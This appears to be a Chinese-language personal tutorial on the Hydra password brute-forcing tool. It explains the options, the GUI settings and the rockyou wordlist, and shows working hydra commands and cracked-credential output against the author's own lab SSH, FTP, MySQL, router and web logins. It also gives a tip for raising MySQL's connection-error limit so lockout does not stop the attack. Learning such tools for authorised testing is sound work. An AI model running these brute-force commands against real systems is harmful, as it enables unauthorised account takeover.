❤️ Hydra 简介

https://www.youtube.com/watch?v=4bR7cTFNPpc

🔸搜索并解压 rockyou 字典(Kali自带.)
    打开资源管理器 ➜ 左上角 places 选择 computer ➜ 搜索 rockyou 会发现有个 rockyou.txt.gz 
    选择这个文件 右键 ➜ open item location 打开文件所在位置 ➜ 再次选择文件 右键 ➜ extract to 解压到 
    ➜ 选择桌面 ➜ 解压出错...

    用命令解压试试 .
    cd /usr/share/wordlists/
    gzip -d rockyou.txt.gz
    可以...  解压出来的文件. 手动放到桌面去


🔸 使用  hydra-gtk 
    kali ➜ 左下角所有程序 ➜ 搜索: hydra-gtk 


🔵 Hydra 
hydra是一款开源的暴力密码破解工具，可以在线破解很多种密码非常强大.破解关键在于强大的字典.
该工具支持几乎所有协议的在线密码破解http/https、ssh/telnet、smb/ftp、cisco、pop3、rdp、imap



Hydra参数详细说明

    l LOGIN：指定破解的用户名称，对特定用户破解。
    L FILE： 从文件中加载用户名进行破解。
    p PASS： 小写字母“p”，指定密码破解，少用，一般采用密码字典。
    P FILE： 大写字母“P”，指定密码字典。

    C FILE：使用冒号分割格式，如“登录名:密码”代替“-L”和“-P”参数。
    e nsr：可选选项，“n”表示空密码试探，“s”表示使用指定用户和密码试探。

    t TASKS：同时运行的连接的线程数，每一台主机默认为16。
    M FILE：指定服务器目标列表文件为每行1条。
    w TIME：设置最大超时时间，单位为秒，默认为30秒。

    o FILE：指定结果输出文件。

    f：在使用“-M”参数以后，在找到第1对登录名或者密码时中止破解。

    v / -V：显示详细过程。
    R：继续上一次破解。
    S：采用SSL链接。
    s PORT：可通过这个参数指定非默认端口。
    U：服务模块使用细节。
    h：更多的命令行选项（完整的帮助文档）。
    server：目标服务器名称或者IP地址（使用此选项或“-M”选项）。
    service：指定服务名，支持的服务和协议包括Telnet、FTP、POP3[-ntlm]、IMAP[-ntlm]、SMB、SMB　NT、http[s]-{head|get}、http-{get|post}-form、http-proxy、Cisco、Cisco-Enable、VNC、LDAP2、LDAP3、MSSQL、MySQL、Oracle-Listener、Postgres、NNTP、Socks5、REXEC、Rlogin、PCNFS、SNMP、RSH、CVS、SVN、ICQ、SAPR3、SSH2、SMTP-Auth[-ntlm]、pcAnywhere、TeamSpeak、SIP、Vmauthd、Firebird、NCP、AFP等。
    OPT：一些服务模块支持额外的输入（“-U”选项用于获取模块的帮助信息）。


















🔵 开始破解.

Tagget 界面 (启动界面)
    设置目标的ip、端口、协议.

    🔸single target
        single target 后面填入目标路由器的ip.
        我们这里是 192.168.11.2 这个是 中继路由器的ip. 不是主路由器的ip.

        首先在kali虚拟机里 ping下 192.168.11.2 看能不能ping通. 虚拟机么.和实体机不一样的.

    🔸port 80
    这里填端口

    🔸protocal 
        被攻击目标所用的协议.这里是网页密码破解.选择 http-get 就可以了

    🔸输出选项:
        打勾 show attempts     查看密码攻击的过程
        打勾 be verbose        详细输出?


passwords 密码界面
    在该界面指定用户名和密码.
    用户名和密码 都可以使用文件!!!来进行批量尝试.

    本例中使用Kali系统中自带的用户名和密码列表文件，并选择Loop around users选项。
    其中，用户名和密码文件分别保存在/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/names/nameslist.txt和/usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt中。

    username 改成 admin
    password list 双击 并定位到 rockyou.txt 文件
    打勾 try login as password


tuning 界面

    在该界面设置任务的编号和超时时间。
    如果运行任务太多的话，服务的响应速率将下降。
    所以要建议将原来默认的任务编号16修改为2，超时时间修改为15。
    然后将Exit after first found pair的复选框勾上，表示找到第一对匹配项时则停止攻击。

start 界面
    在该界面显示了四个按钮，分别是启动、停止、保存输出和清除输出. 单击Start按钮开始攻击，





暴力破解.

🔵 环境

  虚拟机 ip: 192.168.169.137 
  实体机 ip: 192.168.169.1 
  虚拟机的虚拟网络是实体机虚拟出来的. 
  实体机相当于虚拟机的路由器.所以实体机的IP是 192.168.169.1

  🔸扫描实体机IP端口

  root@kali:/usr/share/wfuzz/wordlist# nmap 192.168.169.1

      Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-05 02:07 EDT
      Nmap scan report for 192.168.169.1
      Host is up (0.00012s latency).
      Not shown: 500 closed ports, 493 filtered ports
      PORT      STATE SERVICE
      22/tcp    open  ssh
      80/tcp    open  http
      88/tcp    open  kerberos-sec
      445/tcp   open  microsoft-ds
      3306/tcp  open  mysql
      5432/tcp  open  postgresql
      20005/tcp open  btx
      MAC Address: 00:50:56:C0:00:08 (VMware)

      Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds






🔵 ssh 爆破 ✔︎

    实体机ssh的真实账户密码是  xu.jian i
    我们来看看 能不能用字典爆破.
    首先查看字典. 里面有没有 i 这个密码. 没有就手动加进去.

🔸hydra-gtd
    然后进入 hydra-gtd 进行设置
    target ➜ single target : 192.168.169.1
    target ➜ port : 22
    target ➜ protocol: ssh
    target ➜ output options ➜ 打勾 be verbose
    target ➜ output options ➜ 打勾 show attempts

    passwords ➜  username: xu.jian
    passwords ➜ password list : 双击选择 rockyou.txt 的路径

    start ➜ start ... 等几秒就出来了.
    [22][ssh] host: 192.168.169.1   login: xu.jian   password: i
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-05 02:20:19

    说明确实是可以破解ssh的!! 能不能破解就看你字典是否厉害了..



🔸hydra
　　破解SSH账号有两种方式，一种是指定账号破解，另一种是指定用户列表破解，命令如下。

    语法: hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

    hydra -l root -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
    对IP地址为192.168.44.139的root账号

    hydra -l root -P pwd2.dic -t 1 -vV -e ns -o save.log 192.168.44.139 ssh
    将扫描结果保存在save.log文件中，使用“cat save.log”命令查看扫描结果






🔵 ftp 爆破

  （1）破解指定用户名密码
        hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
        hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

  （2）批量破解FTP账号和密码
        hydra -L list_user -P list_password 192.168.56.101 ftp -V















🔵 mysql 暴破 ✔︎

  🔸首先你得确定 虚拟机可以 连接到mac的mysql.
      需要设置 mac mysql 里面的用户权限..
      root@'%'         ➜ 代表内外网都可以访问
      root@'localhost' ➜ 内网的localhost 可以访问
      root@'127.0.0.1' ➜ 内网的ipv4 可以访问
      root@'::1'       ➜ 内网的ipv6 可以访问


  🔸真实用户密码:  
      用户是root .密码我也忘了..
      如果设置过密码忘记了，那不好意思，不能查看密码，只能查看用户名，
      因为mysql密码是动态md5加密，是不可逆向查询的。
      关于查询用户名：select * from mysql.user ;
      重新设置密码吧 1234 
      1234 在爆破密码字典的 1078行. 


  🔸 开始爆破
        然后进入 xhyda-gtd 进行设置
        target ➜ single target : 192.168.169.1
        target ➜ port : 3306
        target ➜ protocol: mysql
        target ➜ output options ➜ 打勾 be verbose
        target ➜ output options ➜ 打勾 show attempts

        passwords ➜ username: root
        passwords ➜ password list : 双击选择 rockyou.txt 的路径

        tuning ➜ 打勾 exit after first found pair global
                  找到密码就停止爆破! 不然会一直尝试下去...


        👹 [ERROR] Host '192.168.169.137' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'

        连接太多了. 被拒绝了..
        mysql 是有个最大连接错误数量的.
        你尝试太多次. 你这个ip 会被mysql 封掉.. 

        这个最大尝试次数是可以修改的.
        mysql -uroot -t1234  ➜ 登录mysql. 
        mysql> SET GLOBAL max_connect_errors=100000000;

        然后再来破解 就没问题了..
        没几秒 正确密码就出来了.


    数据库服务器的连接，一般来说建议不监听来自网络的连接，而仅仅通过socket连接，这样可以防止绝大多数针对mysql的攻击；
    如果必须要开启mysql的网络连接，则最好设置此值，以防止穷举密码的攻击手段。




🔵 路由登录密码爆破 ✔︎
    Router-Login Brute Force 

    爆破工具主要有两个: Hydra 和 Medusa
    Hydra:  hydra -s 80 -l admin -P /root/Desktop/rockyou.txt 192.168.11.2 http-get /admin/

    
      真实账户密码: admin password

        然后进入 xhyda-gtd 进行设置
        target ➜ single target : 192.168.11.2
        target ➜ port : 80
        target ➜ protocol: http-get
        target ➜ output options ➜ 打勾 be verbose
        target ➜ output options ➜ 打勾 show attempts

        passwords ➜ username: admin
        passwords ➜ password list : 双击选择 rockyou.txt 的路径

        tuning ➜ 打勾 exit after first found pair global
                  找到密码就停止爆破! 不然会一直尝试下去...

        specific ➜  http/https url: http://192.168.11.2/admin/
        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️
        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️
        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️

        start ➜ start 就开始破解了






🔵 GET方式提交，破解Web登录 ✔︎
    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php


    hydra -s 80 -l admin -P /root/Desktop/rockyou.txt -vV -e ns 192.168.11.2 http-get /admin/
    这个居然破解出来了.....

    命令后面必须要有 /admin/啊


